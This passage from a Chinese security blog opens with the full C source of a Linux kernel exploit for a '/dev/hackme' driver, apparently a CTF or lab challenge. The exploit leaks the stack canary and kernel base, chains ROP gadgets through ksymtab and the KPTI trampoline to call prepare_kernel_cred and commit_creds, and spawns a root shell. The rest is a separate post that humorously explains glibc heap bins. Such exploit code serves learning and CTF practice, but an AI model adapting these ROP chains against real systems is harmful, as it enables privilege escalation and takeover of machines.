class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> addr_leak;</span><br><span class="line"><span class="type">size_t</span> off_leak = <span class="number">0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_text_base;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab = <span class="number">0xf85198</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_commit_creds = <span class="number">0xf87d90</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_commit_creds;</span><br><span class="line"><span class="type">size_t</span> addr_commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_prepare_kernel_cred = <span class="number">0xf8d4fc</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_kpti_trampoline = <span class="number">0x200f26</span>;</span><br><span class="line"><span class="type">size_t</span> addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_deref_rax_pop_rbp_ret = <span class="number">0x15a7f</span>;</span><br><span class="line"><span class="type">size_t</span> addr_deref_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rax_ret = <span class="number">0x4d11</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rax_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rdi_ret = <span class="number">0x6370</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_init_task_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">int</span> value_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>;   </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak();  <span class="comment">//泄露canary</span></span><br><span class="line">    leak_prepare_kernel_cred();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking canary and text base&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> buffer[<span class="number">40</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">40</span>*<span class="number">8</span>);</span><br><span class="line">    canary = buffer[<span class="number">0x10</span>];</span><br><span class="line">    addr_leak = buffer[<span class="number">38</span>];</span><br><span class="line"></span><br><span class="line">    addr_text_base = addr_leak - off_leak;</span><br><span class="line">    addr_kpti_trampoline = addr_text_base + off_kpti_trampoline;</span><br><span class="line">    addr_ksymtab = addr_text_base + off_ksymtab;</span><br><span class="line">    addr_ksymtab_commit_creds = addr_text_base + off_ksymtab_commit_creds;</span><br><span class="line">    addr_ksymtab_prepare_kernel_cred = addr_text_base + off_ksymtab_prepare_kernel_cred;</span><br><span class="line">    addr_deref_rax_pop_rbp_ret = addr_text_base + off_deref_rax_pop_rbp_ret;</span><br><span class="line">    addr_pop_rax_ret = addr_text_base + off_pop_rax_ret;</span><br><span class="line">    addr_pop_rdi_ret = addr_text_base + off_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_leak: %p\n&quot;</span>,addr_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_text_base: %p\n&quot;</span>,addr_text_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_kpti_trampoline: %p\n&quot;</span>,addr_kpti_trampoline);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab: %p\n&quot;</span>,addr_ksymtab);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_commit_creds: %p\n&quot;</span>,addr_ksymtab_commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_prepare_kernel_cred: %p\n&quot;</span>,addr_ksymtab_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_deref_rax_pop_rbp_ret: %p\n&quot;</span>,addr_deref_rax_pop_rbp_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rax_ret: %p\n&quot;</span>,addr_pop_rax_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rdi_ret: %p\n&quot;</span>,addr_pop_rdi_ret);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Leak complete\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking prepare_kernel_cred offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_prepare_kernel_cred;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_prepare_kernel_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[+] prepare_kernel_cred offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_prepare_kernel_cred = addr_ksymtab_prepare_kernel_cred - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_prepare_kernel_cred: %p\n&quot;</span>,addr_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_prepare_kernel_cred calculated\n&quot;</span>);</span><br><span class="line">    leak_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking commit_creds offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_commit_creds;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_commit_creds;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    <span class="comment">// puts(&quot;[+] commit_creds offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset,eax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_commit_creds = addr_ksymtab_commit_creds - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_commit_creds: %p\n&quot;</span>,addr_commit_creds);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_commit_creds calculated\n&quot;</span>);</span><br><span class="line">    execute_prepare_kernel_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing prepare_kernel_cred&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = save_init_task_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov addr_init_task_cred,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init task_cred address: %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_init_task_cred saved\n\n&quot;</span>);</span><br><span class="line">    execute_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing commit_creds&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = addr_init_task_cred;</span><br><span class="line">    payload[offset++] = addr_commit_creds;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = spawn_shell;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/" class="post-title-link" itemprop="url">heap bins</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-23 21:31:00 / Modified: 21:35:17" itemprop="dateCreated datePublished" datetime="2024-11-23T21:31:00+08:00">2024-11-23</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="看看你的斌"><a href="#看看你的斌" class="headerlink" title="看看你的斌"></a>看看你的斌</h1><h2 id="11月8日的梦"><a href="#11月8日的梦" class="headerlink" title="11月8日的梦"></a>11月8日的梦</h2><p>11.8睡到下午1点才醒,做了一个特别沙雕的梦</p>
<p>小时候上的厕所长这样,两个高台中间一个坑道</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/9320d00da5b65e5f8474bda8f6e876a.jpg" alt="9320d00da5b65e5f8474bda8f6e876a"></p>
<p>要么站在一侧尿, 要么跨蹲拉</p>
<p>我梦里上了个厕所,这个厕所的坑道很宽,一米</p>
<p>我上去几乎要劈叉,本来不想跨蹲的</p>
<p><strong>但是旁边好几个小朋友</strong></p>
<p>我立刻就跨蹲,小朋友就跟着学</p>
<p>然后就都掉下去了,然后小朋友就溺水</p>
<p>我正好在水流上游</p>
<p>爽死我了</p>
<p>我在上游可劲儿造矢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241108150444057.png" alt="image-20241108150444057"></p>
<h2 id="斌家の故事"><a href="#斌家の故事" class="headerlink" title="斌家の故事"></a>斌家の故事</h2><p>乱斌,小斌,大斌是斌家三兄弟,同处一个屋檐下</p>
<p>快斌是叔辈兄弟,自己另住</p>
<p>这四个傻斌各自开了代销处, 负责倒卖一种叫做<strong>堆块</strong>的货物</p>
<p>最初斌家是一穷二白的, 客户只能去<strong>头块批发市场</strong>亲自拿货</p>
<p>客户用完了的货, 斌家闻着味儿就来拾破烂儿了</p>
<p>快斌性子很急, 喜欢直接抢. 快斌不满足的话, 是轮不到斌家三兄弟的</p>
<p>剩下斌家三兄弟中, 乱斌负责进货, 拿回来后和大斌小斌分货</p>
<p>快斌性子很急, 管理货物简单粗暴但是颇具条理, 他找了10个桩, 每个桩上用铁链拴大小一样的货, 栓了10长串 </p>
<p>乱斌非常不条理, 他自己的货随便乱放, 每次找货都得扒翻半天, 用山东话说就是屑包蛋</p>
<p>小斌就比较条理, 他按照货物大小把货分成了62个箱子, 每个箱子里放大小相近的货</p>
<p>大斌最条理,他不光分了63个箱子放大小相近的货, 如果小箱子空了他还会从大箱子里拿大货拆小然后放到小箱子</p>
<p>因此乱斌知道自己不是理货的料儿, 会及时把货分给大小斌管理, 自己集中精力进货</p>
<p>但是由于快斌喜欢抢东西, 好端端的大货可能被他抢成好几个小货, 这时候如果客户来要大货, 四个斌谁也拿不出来, 也就是形成了外部碎片</p>
<p>这就尴尬了, 什么斌家四飞舞</p>
<p>因此快斌会在此时被制裁, 乖乖交出所有货物组成大货给客户</p>
<p>然而有一天客户嫌斌家四兄弟太飞舞了, 另找了个擦车斌(下简称擦斌)作代理商</p>
<p>擦斌比快斌还急, 急得跟🐎一样, 快斌都抢不过他</p>
<p>这一下子老斌家的生意惨淡了许多</p>
<p><strong>格立北克</strong>帝国吸取了快斌乱抢的教训, 搞了个反垄断, 前七个货让给擦车斌, 之后的货还是由老斌家经营</p>
<p>图偷的pwncollege</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png" alt="free beyond tcache"></p>
<p>本文参考Glibc2.35</p>
<h2 id="meta-meta-data"><a href="#meta-meta-data" class="headerlink" title="meta-meta-data"></a>meta-meta-data</h2><p>本节介绍元数据的元数据,也就是整个<code>ptmalloc</code>的宏观结构,也就是斌の家</p>
<p>更具体的说就是如下两个结构</p>
<table>
<thead>
<tr>
<th>结构体</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>malloc_state</td>
<td>分配区,管理fastbins,bins等元数据</td>
<td><strong>重要</strong></td>
</tr>
<tr>
<td>malloc_par</td>
<td>分配区配置文件,记录tcache桶子容量,最大块大小等配置信息</td>
<td>不是很重要</td>
</tr>
</tbody></table>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code>是<code>ptmalloc</code>中的宏观元数据结构, 其对象被称为“分配区”,比如<code>main_arena</code>就是<strong>主分配区</strong></p>
<p>在多线程环境中,可能存在多个分配区,以应对并发的分配请求</p>
<p>管理着各种<code>bins</code>的元数据信息,比如链表附加头节点的位置</p>
